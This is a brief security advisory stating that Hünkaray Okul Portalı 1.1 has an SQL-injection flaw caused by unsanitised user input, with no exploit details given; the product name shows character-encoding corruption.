HÃ¼nkaray Okul PortalÃ½ is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.

An attacker can exploit this issue by manipulating the SQL query logic to carry out unauthorized actions on the underlying database.

HÃ¼nkaray Okul PortalÃ½ 1.1 is vulnerable to this issue.
